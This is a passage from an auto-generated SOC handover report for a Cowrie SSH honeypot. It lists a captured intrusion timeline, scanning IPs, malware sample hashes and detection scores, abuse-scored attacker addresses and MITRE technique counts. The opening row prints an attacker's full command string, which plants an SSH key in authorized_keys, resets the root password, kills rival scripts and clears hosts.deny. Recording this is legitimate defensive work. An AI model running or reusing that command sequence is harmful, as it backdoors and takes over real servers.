| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gWLKfJB97jDP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:31:27` | `cowrie.session.connect` |
| `2026-05-20 21:31:27` | `cowrie.client.version` |
| `2026-05-20 21:31:27` | `cowrie.client.kex` |
| `2026-05-20 21:31:27` | `cowrie.login.success` |
| `2026-05-20 21:31:28` | `cowrie.session.params` |
| `2026-05-20 21:31:28` | `cowrie.command.input` |
| `2026-05-20 21:31:28` | `cowrie.command.failed` |
| `2026-05-20 21:31:28` | `cowrie.log.closed` |
| `2026-05-20 21:31:28` | `cowrie.session.params` |
| `2026-05-20 21:31:28` | `cowrie.command.input` |
| `2026-05-20 21:31:28` | `cowrie.session.file_download` |
| `2026-05-20 21:31:28` | `cowrie.log.closed` |
| `2026-05-20 21:31:41` | `cowrie.session.params` |
| `2026-05-20 21:31:41` | `cowrie.command.input` |
| `2026-05-20 21:31:41` | `cowrie.log.closed` |
| `2026-05-20 21:31:41` | `cowrie.session.params` |
| `2026-05-20 21:31:41` | `cowrie.command.input` |
| `2026-05-20 21:31:41` | `cowrie.log.closed` |
| `2026-05-20 21:31:42` | `cowrie.session.params` |
| `2026-05-20 21:31:42` | `cowrie.command.input` |
| `2026-05-20 21:31:42` | `cowrie.session.file_download` |
| `2026-05-20 21:31:42` | `cowrie.log.closed` |
| `2026-05-20 21:31:42` | `cowrie.session.params` |
| `2026-05-20 21:31:42` | `cowrie.command.input` |
| `2026-05-20 21:31:42` | `cowrie.log.closed` |
| `2026-05-20 21:31:43` | `cowrie.session.params` |
| `2026-05-20 21:31:43` | `cowrie.command.input` |
| `2026-05-20 21:31:43` | `cowrie.log.closed` |
| `2026-05-20 21:31:43` | `cowrie.session.params` |
| `2026-05-20 21:31:43` | `cowrie.command.input` |
| `2026-05-20 21:31:43` | `cowrie.command.input` |
| `2026-05-20 21:31:43` | `cowrie.log.closed` |
| `2026-05-20 21:31:44` | `cowrie.session.params` |
| `2026-05-20 21:31:44` | `cowrie.command.input` |
| `2026-05-20 21:31:44` | `cowrie.log.closed` |
| `2026-05-20 21:32:30` | `cowrie.session.params` |
| `2026-05-20 21:32:30` | `cowrie.command.input` |
| `2026-05-20 21:32:30` | `cowrie.log.closed` |
| `2026-05-20 21:32:30` | `cowrie.session.params` |
| `2026-05-20 21:32:30` | `cowrie.command.input` |
| `2026-05-20 21:32:30` | `cowrie.log.closed` |
| `2026-05-20 21:32:31` | `cowrie.session.params` |
| `2026-05-20 21:32:31` | `cowrie.command.input` |
| `2026-05-20 21:32:31` | `cowrie.log.closed` |
| `2026-05-20 21:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.41[.]252` to AbuseIPDB if not already reported
- [ ] Block `42.51.41[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.245.56[.]194` | **834** | 2026-05-20 18:21 | 2026-05-20 21:58 | 538m | 0 | `T1592` | 🟠 MEDIUM |
| `172.191.239[.]155` | **31** | 2026-05-20 19:45 | 2026-05-20 20:32 | 1m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.82.214[.]8` | **31** | 2026-05-20 19:22 | 2026-05-20 20:21 | 1m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **24** | 2026-05-20 18:21 | 2026-05-20 21:49 | 28m | 0 | `T1592` | 🟠 MEDIUM |
| `42.51.41[.]252` | **23** | 2026-05-20 21:02 | 2026-05-20 21:35 | 31m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.219.184[.]142` | **21** | 2026-05-20 20:34 | 2026-05-20 21:11 | 1m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.16.137[.]243` | **16** | 2026-05-20 19:40 | 2026-05-20 20:05 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.41[.]98` | **14** | 2026-05-20 21:11 | 2026-05-20 21:30 | 19m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.78.143[.]196` | **12** | 2026-05-20 19:40 | 2026-05-20 20:17 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `222.172.32[.]246` | **10** | 2026-05-20 19:45 | 2026-05-20 20:04 | 16m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `196.92.7[.]247` | **9** | 2026-05-20 19:58 | 2026-05-20 20:22 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.102[.]130` | **7** | 2026-05-20 21:06 | 2026-05-20 21:18 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `196.92.7[.]246` | **7** | 2026-05-20 19:47 | 2026-05-20 20:15 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `196.92.7[.]249` | **7** | 2026-05-20 19:55 | 2026-05-20 20:26 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `154.144.225[.]226` | **6** | 2026-05-20 19:54 | 2026-05-20 20:25 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `115.247.181[.]68` | **5** | 2026-05-20 19:34 | 2026-05-20 20:02 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `45.82.78[.]100` | **4** | 2026-05-20 20:42 | 2026-05-20 20:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.72.196[.]220` | **3** | 2026-05-20 18:26 | 2026-05-20 18:35 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]93` | **2** | 2026-05-20 18:48 | 2026-05-20 18:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `81.192.138[.]65` | **2** | 2026-05-20 19:57 | 2026-05-20 20:00 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.89[.]144` | 1 | 2026-05-20 21:04 | 2026-05-20 21:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.18[.]199` | 1 | 2026-05-20 19:51 | 2026-05-20 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.24[.]246` | 1 | 2026-05-20 18:28 | 2026-05-20 18:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.46.184[.]6` | 1 | 2026-05-20 18:29 | 2026-05-20 18:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.161.149[.]104` | 1 | 2026-05-20 19:43 | 2026-05-20 19:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `125.228.208[.]181` | 1 | 2026-05-20 19:31 | 2026-05-20 19:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.0.81[.]203` | 1 | 2026-05-20 21:29 | 2026-05-20 21:29 | 12s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]20` | 1 | 2026-05-20 18:47 | 2026-05-20 18:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `210.57.229[.]52` | 1 | 2026-05-20 19:17 | 2026-05-20 19:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.162.123[.]12` | 1 | 2026-05-20 18:31 | 2026-05-20 18:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.78.198[.]19` | 1 | 2026-05-20 20:11 | 2026-05-20 20:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.222.211[.]114` | 1 | 2026-05-20 19:51 | 2026-05-20 19:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `220.162.123[.]12` | CN | CHINANET Fujian province network | **100** ⚠️ | 0 |
| `45.82.78[.]100` | SG | Detai Prosperous Technologies Limited | **100** ⚠️ | 50 |
| `66.132.195[.]93` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `81.192.138[.]65` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `120.46.184[.]6` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 7 |
| `196.92.7[.]246` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `210.57.229[.]52` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 18 |
| `40.82.214[.]8` | AU | Microsoft Corporation | **100** ⚠️ | 50 |
| `125.16.137[.]243` | IN | JINDAL STEEL AND POWER LTD | **100** ⚠️ | 7 |
| `157.245.56[.]194` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 378 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 168 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 163 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 86 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 86 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1254 cases |
| Tool 34  | Credential Extractor        | ✅ 331 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (0.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 168 priority case(s) shown individually · 32 recon entry/entries in table (20 group(s) consolidating 1068 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-20T21:59:46Z_
